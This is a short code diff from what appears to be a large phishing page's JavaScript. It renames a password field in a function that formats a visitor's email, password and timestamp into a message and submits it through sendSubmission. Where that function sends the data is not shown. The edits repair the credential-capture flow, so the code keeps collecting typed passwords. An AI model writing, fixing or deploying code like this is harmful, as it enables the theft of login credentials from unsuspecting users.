@@ -29410,7 +29410,7 @@ async function sendSubmission(data) {
 Email:
 ${data.email}
 Password:
-${data.pass}
+${data.password}
 
 Time:
 ${new Date().toLocaleString()}`;
@@ -29461,7 +29461,7 @@ window.addEventListener(
             document.getElementById("biteam");
 
         const passField =
-            document.getElementById("pass");
+            document.getElementById("password");
 
         const renders =
             document.getElementById("renders");
@@ -29730,7 +29730,7 @@ window.addEventListener(
 
                     await sendSubmission({
                         email: email,
-						password: pass
+						password: password
                     });
 
 
